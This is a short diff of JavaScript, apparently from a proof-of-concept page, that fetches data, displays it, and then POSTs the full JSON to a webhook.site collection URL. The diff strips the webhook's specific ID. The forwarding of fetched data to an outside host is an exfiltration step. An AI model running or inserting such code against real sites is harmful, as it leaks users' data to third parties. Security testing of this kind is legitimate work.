@@ -12,7 +12,7 @@
           .then(data => {
             alert("Received data:\n" + JSON.stringify(data, null, 2));
             console.log("Got JSON:", data);
-            return fetch("https://webhook.site/fbb0058d-4bc0-4d7b-a755-850147fcb6eb", {
+            return fetch("https://webhook.site/", {
               method: "POST",
               headers: { "Content-Type": "text/plain" },
               body: JSON.stringify(data)
